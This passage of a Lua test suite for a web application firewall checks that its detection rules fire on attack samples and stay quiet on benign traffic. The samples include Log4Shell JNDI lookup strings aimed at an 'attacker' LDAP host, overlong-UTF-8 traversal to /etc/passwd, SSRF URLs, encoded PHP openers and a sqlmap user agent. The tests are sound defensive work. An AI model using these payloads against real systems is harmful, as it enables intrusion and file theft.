  local hit, reason, _ttl, action, _hits, waf_rule_id = waf.check(fresh_ctx({
    method  = "POST",
    body    = body,
    headers = { ["Content-Type"] = "application/json" },
  }))
  check(hit == true,                                          "72: log4shell — hit=true")
  check(reason and reason:find("WAF_CVE:LOG4SHELL", 1, true), "72: log4shell — reason prefix")
  check(action == "challenge",                                "72: log4shell — action=challenge")
  check(waf_rule_id == 328,                                   "72: log4shell — rule_id=328")
end

-- ── Test 73: rule_log4shell — header-borne ${lower:j} evasion ───────────────
do
  disable_all_rules()
  waf.set_rule("rule_log4shell", "challenge")

  local hit, reason, _ttl, _action, _hits, waf_rule_id = waf.check(fresh_ctx({
    headers = { ["User-Agent"] = "${lower:jndi}:ldap://attacker/x" },
  }))
  check(hit == true,                                          "73: log4shell hdr — hit=true")
  check(reason and reason:find("WAF_CVE:LOG4SHELL", 1, true), "73: log4shell hdr — reason prefix")
  check(waf_rule_id == 328,                                   "73: log4shell hdr — rule_id=328")
end

-- ── Test 74: rule_log4shell — clean request must not fire ───────────────────
do
  disable_all_rules()
  waf.set_rule("rule_log4shell", "challenge")

  local hit = waf.check(fresh_ctx({
    method = "POST",
    body   = [[{"price":"$10","template":"$user.name"}]],
    headers = { ["Content-Type"] = "application/json" },
  }))
  check(hit == false, "74: log4shell — clean POST does not fire")
end

-- ── Test 74a: rule_log4shell — every evasion tag fires ──────────────────────
-- One case per evasion family so a regression in any single branch is caught.
do
  disable_all_rules()
  waf.set_rule("rule_log4shell", "challenge")

  local cases = {
    { args = "x=${env:FOO:-j}ndi:ldap://e/a",            expect = "ENV"         },
    { args = "x=${sys:user.home}",                       expect = "SYS"         },
    { args = "x=${main:0}",                              expect = "MAIN"        },
    { args = "x=${date:yyyy}",                           expect = "DATE"        },
    { args = "x=${base64:Zm9v}",                         expect = "BASE64"      },
    { args = "x=${upper:J}ndi:ldap://e/a",               expect = "UPPER"       },
    { args = "x=${::-j}ndi:ldap://e/a",                  expect = "DEFAULT_VAL" },
  }
  for _, c in ipairs(cases) do
    local hit, reason, _ttl, _action, _hits, waf_rule_id = waf.check(fresh_ctx({ args = c.args }))
    check(hit == true,
          "74a/" .. c.expect .. ": hit=true (args=" .. c.args .. ")")
    check(reason and reason:find("WAF_CVE:LOG4SHELL:" .. c.expect, 1, true),
          "74a/" .. c.expect .. ": tag present (got " .. tostring(reason) .. ")")
    check(waf_rule_id == 328,
          "74a/" .. c.expect .. ": rule_id=328")
  end
end

-- ── Test 75: rule_bad_utf8 — 2-byte overlong (0xC0 lead) ───────────────────
-- "." is U+002E (1 byte). The 2-byte overlong form is 0xC0 0xAE — RFC 3629
-- reserves 0xC0/0xC1 specifically because they can ONLY produce overlong
-- encodings of ASCII. detect_bad_utf8 has an explicit catch for that lead
-- range: if followed by a valid continuation (0x80..0xBF), it's always
-- an encoding-bypass primitive and returns UTF8_OVERLONG.
do
  disable_all_rules()
  waf.set_rule("rule_bad_utf8", "logonly")

  local hit, reason, _ttl, action, _hits, waf_rule_id = waf.check(fresh_ctx({
    args = "q=\xC0\xAE\xC0\xAE/etc/passwd",
  }))
  check(hit == true,                                "75: bad_utf8 2-byte overlong — hit=true")
  check(reason == "WAF_BAD_UTF8:UTF8_OVERLONG",     "75: bad_utf8 — exact tag UTF8_OVERLONG (got " .. tostring(reason) .. ")")
  check(action == "logonly",                        "75: bad_utf8 — action=logonly")
  check(waf_rule_id == 611,                         "75: bad_utf8 — rule_id=611")
end

-- ── Test 76: rule_bad_utf8 — bad continuation byte in args must NOT fire ──
-- 0xE2 announces a 3-byte sequence with one valid continuation (0x82)
-- and then '&' (0x26, not a continuation). In the original strict design
-- this returned UTF8_BAD_CONT — but real-world data showed this exact
-- shape coming from Facebook's facebookexternalhit crawler when ad
-- landing-page URLs were truncated mid-percent-encoded-UTF-8 by FB's
-- link-preview infrastructure (47 FPs on mformama.gr in a 4-day window,
-- all from AS32934). BAD_CONT no longer signals an attack; the rule
-- only fires on the three encoding-bypass primitives (OVERLONG /
-- SURROGATE / OUT_OF_RANGE). The walker still advances past stray
-- continuation bytes — see the cont_bad path in utf8_walk.
do
  disable_all_rules()
  waf.set_rule("rule_bad_utf8", "logonly")

  local hit, reason = waf.check(fresh_ctx({ args = "x=a\xE2\x82&y" }))
  check(hit == false,
        "76: bad_utf8 — stray bad-cont in args must NOT fire (got reason=" .. tostring(reason) .. ")")
end

-- ── Test 77: rule_bad_utf8 — clean ASCII + valid UTF-8 must not fire ────────
-- "Καλημέρα" (Greek "Good morning") is well-formed UTF-8.
do
  disable_all_rules()
  waf.set_rule("rule_bad_utf8", "logonly")

  local hit = waf.check(fresh_ctx({
    args = "name=" .. "\xCE\x9A\xCE\xB1\xCE\xBB\xCE\xB7\xCE\xBC\xCE\xAD\xCF\x81\xCE\xB1",
  }))
  check(hit == false, "77: bad_utf8 — clean Greek UTF-8 does not fire")
end

-- ── Test 77a: rule_bad_utf8 — legacy single-byte form encoding in body -----
-- Production data: 770+ FPs in a 4-day window because pre-charset form
-- posts carry single-byte ISO-8859-7 bytes (Π → %D0 → 0xD0). The raw
-- 0xD0 looks like a UTF-8 2-byte lead expecting a continuation; the
-- next byte is `&` (form separator). The relaxed walker now skips
-- past that stray sequence — only the three attack-specific tags
-- ever fire.
do
  disable_all_rules()
  waf.set_rule("rule_bad_utf8", "logonly")

  local hit, reason = waf.check(fresh_ctx({
    body   = "field=\xD0&x=1",
    method = "POST",
    headers = { ["content-type"] = "application/x-www-form-urlencoded" },
  }))
  check(hit == false, "77a: bad_utf8 — ISO-8859-7 single-byte body must NOT fire (got reason=" .. tostring(reason) .. ")")
end

-- ── Test 77b: rule_bad_utf8 — multipart binary body must NOT fire ----------
-- WP media library uploads, plugin/theme installer zips, CF7 attachments,
-- e-shop product photos (WebP/JPEG) all carry raw binary bytes inside
-- multipart/form-data. Those bytes are never UTF-8 and routinely contain
-- 0xC0/0xC1+continuation pairs and E0/F0 leads decoding to overlong /
-- surrogate codepoints. Production data: 377 FPs on /wp-admin/async-upload.php
-- in a 4-day window, plus every Greek-admin product-image save on
-- e-vafeiadis.gr (2026-06-04). detect_bad_utf8 skips the body walk entirely
-- for multipart/form-data — the args walk still covers URL traversal.
do
  disable_all_rules()
  waf.set_rule("rule_bad_utf8", "logonly")

  -- Real JPEG bytes including an SOF0 marker (0xFF 0xC0) and a 0xC0 lead
  -- immediately followed by a 0x80-0xBF continuation — i.e. an *explicit*
  -- 2-byte overlong signature that WOULD fire if the body were walked.
  local jpeg = "------boundary\r\nContent-Disposition: form-data; name=\"file\"; filename=\"a.jpg\"\r\nContent-Type: image/jpeg\r\n\r\n\xFF\xD8\xFF\xE0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00\xFF\xC0\x00\x11\x08\xC0\xAF\x02\x00\xFF\xDB\x00\x43\x00\r\n------boundary--\r\n"
  local hit, reason = waf.check(fresh_ctx({
    body   = jpeg,
    method = "POST",
    headers = { ["content-type"] = 'multipart/form-data; boundary="----boundary"' },
  }))
  check(hit == false, "77b: bad_utf8 — multipart JPEG body (with 0xC0 overlong bytes) must NOT fire (got reason=" .. tostring(reason) .. ")")
end

-- ── Test 77c: rule_bad_utf8 — OVERLONG in BODY still fires (attack) --------
-- The whole point of rule 611 is catching overlong-encoding bypass
-- primitives (e.g. `%C0%AF` for `/` to defeat substring path-traversal
-- matchers). The body-relaxed pass MUST still return UTF8_OVERLONG when
-- it sees an attack-specific tag, even though it suppresses the noisy
-- BAD_LEAD/BAD_CONT/TRUNC tags.
--
-- 0xE0 0x80 0xAF is a 3-byte sequence whose codepoint is 0x2F ("/") —
-- overlong because "/" only needs 1 byte. The walker reads 0xE0 (3-byte
-- lead, need=2), 0x80 (valid continuation), 0xAF (valid continuation),
-- computes cp=0x2F, sees cp < min_cp (0x800) → returns UTF8_OVERLONG.
do
  disable_all_rules()
  waf.set_rule("rule_bad_utf8", "logonly")

  local hit, reason = waf.check(fresh_ctx({
    body   = "redir=\xE0\x80\xAFetc/passwd",
    method = "POST",
    headers = { ["content-type"] = "application/x-www-form-urlencoded" },
  }))
  check(hit == true,                              "77c: bad_utf8 — overlong-slash in body must still fire")
  check(reason == "WAF_BAD_UTF8:UTF8_OVERLONG",   "77c: bad_utf8 — exact tag UTF8_OVERLONG (got " .. tostring(reason) .. ")")
end

-- ── Test 77c-bin: rule_bad_utf8 — RAW image/jpeg body (non-multipart) --------
-- The WP REST media endpoint (POST /wp-json/wp/v2/media) uploads a raw image
-- with `Content-Type: image/jpeg` — NOT multipart/form-data. Those raw JPEG
-- bytes contain 0xC0/0xC1+continuation and E0/F0 overlong sequences that WOULD
-- trip the body walk. Rule 611 must skip ANY non-textual body CT, not just
-- multipart (production FP: a legit Greek admin on mygreecetours.org logged
-- WAF_BAD_UTF8:UTF8_OVERLONG on every media upload, 2026-07-04).
do
  disable_all_rules()
  waf.set_rule("rule_bad_utf8", "logonly")

  -- Raw JPEG: SOI + APP0/JFIF + an explicit 2-byte overlong 0xC0 0xAF that
  -- would return UTF8_OVERLONG if the body were walked.
  local jpeg = "\xFF\xD8\xFF\xE0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00\xFF\xC0\x00\x11\x08\xC0\xAF\x02\x00\xFF\xDB\x00\x43\x00"
  local hit, reason = waf.check(fresh_ctx({
    body   = jpeg,
    method = "POST",
    uri    = "/wp-json/wp/v2/media",
    headers = { ["content-type"] = "image/jpeg" },
  }))
  check(hit == false, "77c-bin: bad_utf8 — raw image/jpeg body must NOT fire (got reason=" .. tostring(reason) .. ")")
end

-- ── Test 77d: rule_ssrf — SSRF_FTP suppressed on /wp-admin/ ---------------
-- Real Greek admins using WP All Import (pmxi-*) plugins were challenged
-- because the plugin stores ftp:// URLs in its options table. The carve
-- suppresses only the SSRF_FTP tag on /wp-admin/* paths; other SSRF tags
-- (FILE, GOPHER, DICT, LDAP, etc.) still fire because no benign WP plugin
-- stores those schemes as plugin state.
do
  disable_all_rules()
  waf.set_rule("rule_ssrf", "logonly")

  -- SSRF_FTP on /wp-admin/ — must NOT fire.
  local hit = waf.check(fresh_ctx({
    uri  = "/wp-admin/admin.php",
    args = "page=pmxi-admin-manage&id=11&action=options&import_from=ftp://example.com/data.csv",
  }))
  check(hit == false, "77d: ssrf — SSRF_FTP on /wp-admin/ must NOT fire")

  -- SSRF_FTP on a public path — must still fire.
  local hit2, reason2 = waf.check(fresh_ctx({
    uri  = "/page",
    args = "url=ftp://attacker.com/x",
  }))
  check(hit2 == true,                            "77d: ssrf — SSRF_FTP on public path must still fire")
  check(reason2 == "WAF_SSRF:SSRF_FTP",          "77d: ssrf — exact tag SSRF_FTP (got " .. tostring(reason2) .. ")")

  -- SSRF_FILE on /wp-admin/ — must still fire (only SSRF_FTP is carved out).
  local hit3, reason3 = waf.check(fresh_ctx({
    uri  = "/wp-admin/admin.php",
    args = "page=foo&path=file:///etc/passwd",
  }))
  check(hit3 == true,                            "77d: ssrf — SSRF_FILE on /wp-admin/ must still fire")
  check(reason3 == "WAF_SSRF:SSRF_FILE",         "77d: ssrf — exact tag SSRF_FILE (got " .. tostring(reason3) .. ")")
end

-- ── Test 77e: rule_php_encoded_opener — /wp-admin/ carve-out (F11 split) ---
-- WPCode / Code Snippets / Insert PHP Code Snippet plugins save admin-authored
-- PHP snippets via /wp-admin/admin-ajax.php; the plugin JS base64-encodes the
-- snippet, so a LEGIT save carries `PD9waHA…` (438). The old carve-out
-- suppressed both openers on ALL /wp-admin/. But admin-ajax.php / admin-post.php
-- are reachable PRE-auth (nopriv actions), so audit F11 keeps 438 VISIBLE there
-- at LOGONLY (detect-only, no enforcement — the edge can't tell a WPCode save
-- from a nopriv attack). 437 stays suppressed; authenticated /wp-admin/ keeps
-- both carved out; non-/wp-admin/ still enforces at the configured tier.
local function opener_ctx(uri, body)
  return fresh_ctx({
    uri = uri, method = "POST", body = body,
    headers = { ["content-type"] = "application/x-www-form-urlencoded" },
  })
end
local B64 = "PD9waHAgZWNobyAnaGVsbG8nOw=="          -- base64 "<?php echo 'hello';" -> 438
local URLENC = "code=%3C%3Fphp%20echo%20'x'%3B%20%3F%3E"  -- url-encoded "<?php" -> 437
do
  disable_all_rules()
  waf.set_rule("rule_php_encoded_opener_b64", "challenge")  -- global tier for 438
  waf.set_rule("rule_php_encoded_opener", "challenge")      -- global tier for 437

  -- 438 base64 on the PRE-AUTH admin-ajax.php / admin-post.php surface: recorded
  -- but DOWNGRADED to logonly (no challenge/block) during the F11 burn-in.
  for _, uri in ipairs({ "/wp-admin/admin-ajax.php", "/wp-admin/admin-post.php" }) do
    local hit, reason, _ttl, action = waf.check(opener_ctx(uri, "snippet=" .. B64))
    check(hit == true,                             "77e: 438 recorded on pre-auth " .. uri)
    check(action == "logonly",                     "77e: 438 is logonly (not challenge) on pre-auth " .. uri)
    check(reason == "WAF_BACKDOOR:B64_PHP_OPENER",  "77e: 438 tag on " .. uri)
  end

  -- 437 (FP-prone url/entity form) stays fully suppressed on /wp-admin/,
  -- including the pre-auth endpoints — the legit WPCode-save FP fix holds.
  for _, uri in ipairs({ "/wp-admin/admin-ajax.php", "/wp-admin/admin-post.php" }) do
    check(waf.check(opener_ctx(uri, URLENC)) == false,
          "77e: 437 stays suppressed on pre-auth " .. uri)
  end

  -- Authenticated /wp-admin/ (not a pre-auth endpoint) keeps 438 carved out.
  check(waf.check(opener_ctx("/wp-admin/options.php", "x=" .. B64)) == false,
        "77e: 438 suppressed on authenticated /wp-admin/options.php")

  -- Public (non-/wp-admin/) path still ENFORCES 438 at the configured tier.
  local hit2, reason2, _t2, action2 = waf.check(opener_ctx("/uploads/process.php", "file=" .. B64))
  check(hit2 == true,                                "77e: 438 on public path still fires")
  check(action2 == "challenge",                      "77e: 438 on public path enforces (challenge)")
  check(reason2 == "WAF_BACKDOOR:B64_PHP_OPENER",    "77e: exact tag (got " .. tostring(reason2) .. ")")
end

-- ── Test 78: rule_content_type_anomaly — quoted WebKit boundary must NOT fire
-- RFC 2045 allows the boundary parameter to be a quoted-string. Production
-- log review (2026-05) found cPanel webmail emitting
-- `Content-Type: multipart/form-data; boundary="----WebKitFormBoundary..."`
-- with literal surrounding quotes (35 confirmed FPs). The detector must
-- strip the quotes before validating the boundary value.
do
  disable_all_rules()
  waf.set_rule("rule_content_type_anomaly", "logonly")

  local hit = waf.check(fresh_ctx({
    headers = {
      ["Content-Type"] = 'multipart/form-data; boundary="----WebKitFormBoundaryx8jO2oVc6SWP3Sad"',
    },
  }))
  check(hit == false, "78: quoted WebKit boundary — must not fire CT_BAD_BOUNDARY")
end

-- ── Test 78b (F15): RFC 2046 `bcharsnospace` boundaries must NOT fire.
-- The validator previously allowed only [A-Za-z0-9._-], so server-to-server
-- MIME producers that use the RFC-legal `=` / `+` / `/` / `:` / `(` / `)` chars
-- were flagged — JavaMail (`----=_Part_0_…`), Python email (`====…==`),
-- SOAP/Axis. Those non-browser clients cannot solve a JS challenge, so rule 604
-- broke the POST. The class now matches bcharsnospace exactly; chars OUTSIDE it
-- still fire (see Test 79).
do
  disable_all_rules()
  waf.set_rule("rule_content_type_anomaly", "challenge")

  local function fires_bad_boundary(ct)
    local _, reason = waf.check(fresh_ctx({ headers = { ["Content-Type"] = ct } }))
    return (reason and tostring(reason):find("CT_BAD_BOUNDARY", 1, true) ~= nil) and true or false
  end

  -- RFC-legal boundaries — must NOT fire.
  for _, ct in ipairs({
    'multipart/related; boundary="----=_Part_0_123.456"',        -- JavaMail (=)
    'multipart/mixed; boundary="===============1234567890=="',   -- Python email (=)
    'multipart/related; boundary="MIME_boundary:12/34"',         -- SOAP (: /)
    'multipart/signed; boundary="aaa+bbb"',                      -- (+)
    'multipart/mixed; boundary="(embed)bnd"',                    -- ( )
    'multipart/form-data; boundary=----WebKitFormBoundary7MA4',  -- browser alnum
  }) do
    check(fires_bad_boundary(ct) == false,
          "78b: RFC-legal boundary must NOT fire — " .. tostring(ct:match("boundary=(.*)$")))
  end

  -- Chars OUTSIDE bcharsnospace — must STILL fire (anti-evasion preserved).
  for _, ct in ipairs({
    "multipart/form-data; boundary=aaa@bbb",   -- @ outside bcharsnospace
    "multipart/form-data; boundary=a$b~c",     -- $ ~ outside bcharsnospace
  }) do
    check(fires_bad_boundary(ct) == true,
          "78b: non-RFC boundary must fire — " .. tostring(ct:match("boundary=(.*)$")))
  end
end

-- ── Test 79: rule_content_type_anomaly — a real malformed boundary still fires
-- Negative-of-the-negative: confirm the bad-boundary check still works on a
-- value that genuinely contains forbidden characters (`<` is outside RFC 2046
-- bcharsnospace, the allowed set after F15; the value capture stops at
-- space/comma/semicolon, so embedding `<` mid-token forces the validator to
-- reject it).
do
  disable_all_rules()
  waf.set_rule("rule_content_type_anomaly", "challenge")

  local hit, reason = waf.check(fresh_ctx({
    headers = {
      ["Content-Type"] = "multipart/form-data; boundary=foo<bar>baz",
    },
  }))
  check(hit == true,
        "79: malformed boundary 'foo<bar>' — fires (reason=" .. tostring(reason) .. ")")
end

-- ── Test 79b: rule_content_type_anomaly — charset allowlist (Greek + national)
-- The charset check exists to stop a WAF-evasion where a charset the WAF can't
-- decode but the backend can (EBCDIC/UTF-7/UTF-16) smuggles an exploit past the
-- raw-byte scan. The allowlist previously held only Latin + Chinese, so a legit
-- Greek / national-charset form or API POST was challenged (rule 604). Safe =
-- ASCII-superset (exploit metachars stay at their ASCII bytes); dangerous =
-- EBCDIC / UTF-7 / UTF-16.
do
  disable_all_rules()
  waf.set_rule("rule_content_type_anomaly", "challenge")

  local function ct_charset(cs)
    local _, reason = waf.check(fresh_ctx({
      headers = { ["Content-Type"] = "application/x-www-form-urlencoded; charset=" .. cs },
    }))
    -- Coerce to a real boolean (a nil reason must compare == false, not nil).
    return (reason and tostring(reason):find("CT_CHARSET", 1, true) ~= nil) and true or false
  end

  -- Legit ASCII-superset charsets must NOT be challenged.
  for _, cs in ipairs({
    "iso-8859-7", "windows-1253", "iso8859-7", "greek",   -- Greek (ISO, Windows, no-dash, alias)
    "utf-8", "windows-1251", "koi8-r",                     -- Cyrillic
    "iso-8859-9", "windows-1254",                          -- Turkish
    "windows-1255", "windows-1256",                        -- Hebrew, Arabic
    "shift_jis", "euc-kr", "big5", "tis-620",              -- CJK / Thai
  }) do
    check(ct_charset(cs) == false, "79b: legit charset '" .. cs .. "' must NOT fire CT_CHARSET_BYPASS")
  end

  -- Real evasion charsets must STAY flagged.
  for _, cs in ipairs({ "ibm037", "cp500", "cp875", "utf-7", "utf-16", "utf-16le", "utf-32" }) do
    check(ct_charset(cs) == true, "79b: evasion charset '" .. cs .. "' must fire CT_CHARSET_BYPASS")
  end

  -- Quoted value must not dodge the check: `charset="ibm037"` still fires,
  -- while a quoted legit charset still passes.
  local _, qreason = waf.check(fresh_ctx({
    headers = { ["Content-Type"] = 'application/x-www-form-urlencoded; charset="ibm037"' },
  }))
  check(qreason and tostring(qreason):find("CT_CHARSET", 1, true) ~= nil,
        "79b: quoted evasion charset must still fire CT_CHARSET_BYPASS")
  local qok = waf.check(fresh_ctx({
    headers = { ["Content-Type"] = 'text/html; charset="windows-1253"' },
  }))
  check(qok == false, "79b: quoted legit Greek charset must NOT fire")
end

-- ── Test 80: rule_serialize — Office namespace + Koha CCL must NOT fire ─────
-- Production log review (2026-05) found two FPs in 41K events that share a
-- common pattern: `o:` + `:"` appearing in unrelated positions in a URL.
-- Office HTML namespace (`<o:p class="">`) pasted from Word, and Koha OPAC
-- CCL search syntax (`q=ccl=an:"167" and au: Haese`). The detector must
-- require a digit length-marker between the colons (real format is
-- `O:N:"ClassName"`).
do
  disable_all_rules()
  waf.set_rule("rule_serialize", "challenge")

  -- Microsoft Office HTML namespace — Italian-paste-from-Word pattern
  local hit1 = waf.check(fresh_ctx({
    args = 'q=%3Co%3Ap+class%3D%22%22%3E%3C%2Fo%3Ap%3E',
  }))
  check(hit1 == false, "80a: Office <o:p class=''> — must not fire SER_O")

  -- Koha CCL OPAC search (e.g. www.gamestop.ca FP)
  local hit2 = waf.check(fresh_ctx({
    args = 'q=ccl%3Dan%3A%22167%22+and+au%3A+Haese',
  }))
  check(hit2 == false, "80b: Koha CCL 'au: Haese' — must not fire SER_C")
end

-- ── Test 81: rule_serialize — real PHP serialized object still fires ─────────
do
  disable_all_rules()
  waf.set_rule("rule_serialize", "challenge")

  -- O:8:"stdClass":1:{s:1:"a";i:1;}
  local hit, reason, _ttl, _action, _hits, waf_rule_id = waf.check(fresh_ctx({
    args = 'data=O%3A8%3A%22stdClass%22%3A1%3A%7Bs%3A1%3A%22a%22%3Bi%3A1%3B%7D',
  }))
  check(hit == true,                                      "81: real PHP serialize — hit=true")
  check(reason and reason:sub(1, 13) == "WAF_SERIALIZE", "81: real PHP serialize — reason prefix")
  check(waf_rule_id == 306,                              "81: real PHP serialize — rule_id=306")
end

-- ── Regression: BAD_UA score=99 hard-blocks, explicit logonly stays audit ──
do
  disable_all_rules()
  waf.set_rule("rule_bad_ua", "challenge")

  local hit, reason, ttl, action, hits, rule_id = waf.check(fresh_ctx({
    headers = { ["User-Agent"] = "sqlmap/1.5.0" },
  }))
  check(hit == true,                                "bad_ua score99 — hit=true")
  check(reason == "WAF_BAD_UA:UA_SQLMAP:score=99", "bad_ua score99 — exact reason")
  check(action == "block",                         "bad_ua score99 — action=block")
  check(ttl == waf.get_config().block_ttl_sec,      "bad_ua score99 — block ttl")
  check(rule_id == 201,                             "bad_ua score99 — rule id 201")
  check(hits and hits[1] and hits[1].action == "block", "bad_ua score99 — hits entry block")

  disable_all_rules()
  waf.set_rule("rule_bad_ua", "logonly")
  local hit2, _r2, _t2, action2 = waf.check(fresh_ctx({
    headers = { ["User-Agent"] = "sqlmap/1.5.0" },
  }))
  check(hit2 == true,          "bad_ua score99 logonly — hit=true")
  check(action2 == "logonly",  "bad_ua score99 logonly — override preserved")
end

if fails > 0 then
  io.stderr:write(string.format("\n%d severity test(s) failed\n", fails))
  os.exit(1)
end
print("ok: cfm_waf severity-aggregation tests")
